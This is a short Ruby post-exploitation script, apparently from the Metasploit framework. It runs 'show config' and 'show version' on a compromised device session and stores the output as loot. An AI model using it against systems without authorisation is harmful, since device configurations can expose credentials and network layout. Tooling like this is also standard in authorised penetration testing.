##
# $Id$
##

#
# Collect various device information from the machine on the other end of the session.
#

print_status("Collecting the device information data.")

data = ''

#
# Get device information
#
cmd = "show config\nshow version\nhelp"
output = client.shell_command(cmd)
if (output)
	data << output
end

#
# Store what we found
#
if (data.length > 0)
	pro.store_loot("host.device.config", "text/plain", client, data.strip)
end

